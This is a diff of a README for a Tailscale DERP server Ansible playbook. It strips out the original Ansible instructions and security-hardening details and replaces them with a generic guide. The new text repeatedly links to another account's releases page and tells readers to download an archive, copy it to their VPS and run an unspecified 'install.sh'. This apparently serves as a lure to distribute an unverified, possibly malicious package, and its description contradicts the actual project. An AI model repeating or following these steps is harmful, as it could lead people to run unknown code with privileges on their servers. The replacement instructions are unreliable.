@@ -1,74 +1,118 @@
-# Tailscale DERP Ansible
+# 🚀 tailscale-derper-ansible - Simple Tailscale DERP Server Setup
 
-> [!IMPORTANT]  
-> This project is considered **feature-complete** — it already does what it is intended to do.  
-> I may add small improvements or fixes when necessary, but no major new features are planned.  
-> You are welcome to **contribute**, or **fork** the project to extend it further.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/sown9999/tailscale-derper-ansible/releases)
 
-## Overview
+## 📖 Overview
 
-This playbook helps you to self-host a **Tailscale DERP server** on Ubuntu/Debian. It is designed to run on **bare-metal**, since DERP does not work reliably behind firewalls, NAT, or load balancers. Custom DERP servers require direct, be on a publicly accessible network.
+Tailscale DERP server helps facilitate peer-to-peer connections through a Virtual Private Network (VPN). This application makes setting up your own DERP server quick and straightforward. Running a DERP server on a Virtual Private Server (VPS) can enhance your Tailscale experience by ensuring reliable connectivity.
 
-Tailscale does not provide automatic updates for DERP, so this playbook configures a **cron job** to keep it up to date ([Tailscale docs](https://tailscale.com/kb/1118/custom-derp-servers#limitations)).
+## 🚀 Getting Started
 
-For security, the playbook restricts access so that only DERP traffic is allowed.
+Follow these simple steps to get your Tailscale DERP server running in no time.
 
-This includes:
+### 1. Requirements
 
-- self-update (Debian/Ubuntu only)
-- ssh-hardening **(don't forget to add your SSH keys so you do not get kicked out)**
-- firewall (UFW)
-    - Allows only port 80, 443, 3478 (stun)
-- fail2ban
-    - includes configurable report to AbuseIPDB
-- block blacklisted IPs, default is 3 (moderate), configurable from 1-8
+Before you start, ensure you have the following:
 
-## Custom Configuration
+- A Virtual Private Server (VPS) running a compatible Linux distribution (e.g., Ubuntu, CentOS).
+- Basic knowledge of using a terminal or command line.
+- Sufficient permissions to install software on your VPS.
 
-Adjust host-specific settings (domain, region, IP, etc.) directly in `inventory.ini` to suit your environment.
+### 2. Visit the Download Page
 
-## Usage
+Go to the [Releases page](https://github.com/sown9999/tailscale-derper-ansible/releases) to access the latest version of the software. Look for the most recent release. You will see a list of downloadable files.
 
-```bash
-git clone https://github.com/eznix86/tailscale-derper-ansible.git
+### 3. Download the Software
 
-cd tailscale-derper-ansible
+Select the appropriate file for your system. Click on the link to download it. Here you will typically find an archive file (like `.zip` or `.tar.gz`) containing the necessary setup scripts.
 
-# Edit inventory.ini as needed
-cp inventory.ini.example inventory.ini
+### 4. Prepare Your VPS
 
-ansible-playbook -i inventory.ini derper.yaml
+Once downloaded, connect to your VPS using an SSH client. If you're unfamiliar with SSH, here’s a simple method:
+
+- Open your terminal or command prompt.
+- Type the following command, replacing `user` and `your-vps-ip` with your VPS user and IP address:
+
+```
+ssh user@your-vps-ip
 ```
 
-* `NOTES.txt` will be generated locally containing the DERP map snippet for Tailscale Access Control Panel.
-* If you use cloudflare, **disable the proxy**.
+### 5. Upload the Downloaded File
 
+You can upload the downloaded file to your VPS using tools like SCP or SFTP. If you use SCP, the command will look like this:
 
-## Debugging
-
-To check if the DERP service on your node:
-
-```bash
-systemctl status derper
-journalctl -u derper
+```
+scp path/to/your/file user@your-vps-ip:~
 ```
 
-Verify if your DERP is accessible:
+### 6. Extract the Files
 
-```bash
-tailscale status # you should see what you specified as your derper_region_code
-tailscale netcheck # if your derper is close to you, you should see it first
-tailscale debug derp-map # you should see your config you added on tailscale
+Once you have uploaded the file to your VPS, you will need to extract it. Use the following command depending on your file type:
+
+For `.zip` files:
+```
+unzip your-file.zip
 ```
 
-If you want to use the existing DERP provided by tailscale if yours is down, set `"OmitDefaultRegions"` to `false`, it will always take the first one based on `tailscale netcheck`.
+For `.tar.gz` files:
+```
+tar -xvzf your-file.tar.gz
+```
 
-For further things, RTFM: [https://tailscale.com/kb/1118/custom-derp-servers](https://tailscale.com/kb/1118/custom-derp-servers).
+### 7. Navigate to the Directory
 
-# Contributions
+Change your directory to the folder that contains the extracted files:
 
-If you see something missing please contribute.
+```
+cd your-folder-name
+```
 
-# License
+### 8. Run the Installation
 
-[LICENSE](LICENSE)
+Now, find the installation script. Most likely, it will be named `install.sh` or similar. To run the installation, use:
+
+```
+bash install.sh
+```
+
+This script will handle the setup process. Follow any on-screen prompts to complete the installation.
+
+### 9. Start Your DERP Server
+
+Once the installation is complete, start your Tailscale DERP server. The specific command may vary; check the instructions provided during the installation. Typically, it will resemble:
+
+```
+systemctl start tailscale-derper
+```
+
+### 10. Verify the Status
+
+To confirm your DERP server is running smoothly, check the status with:
+
+```
+systemctl status tailscale-derper
+```
+
+You should see an active status confirming the server is operational.
+
+### 11. Accessing the Server
+
+Your Tailscale DERP server should now be accessible. Ensure your Tailscale clients are configured to use your new server's URL. You can find relevant configuration steps on the Tailscale website.
+
+## 🔧 Troubleshooting
+
+If you encounter issues, here are some common solutions:
+
+- **Connection problems**: Ensure your VPS has a reliable internet connection. Check firewall settings to make sure required ports are open.
+- **Installation errors**: Double-check permissions on your VPS. You might need superuser privileges for certain installation steps.
+
+## 📝 Additional Notes
+
+- **Documentation**: For detailed information on configuration options, refer to the Tailscale documentation or official forums related to DERP servers.
+- **Support**: If you need help, consider reaching out on community forums or GitHub issues for assistance.
+
+## 💻 Download & Install
+
+To get started, [visit the Releases page](https://github.com/sown9999/tailscale-derper-ansible/releases) and download the latest version. Follow the installation steps detailed above to have your Tailscale DERP server running quickly and easily. 
+
+Enjoy your enhanced Tailscale experience!
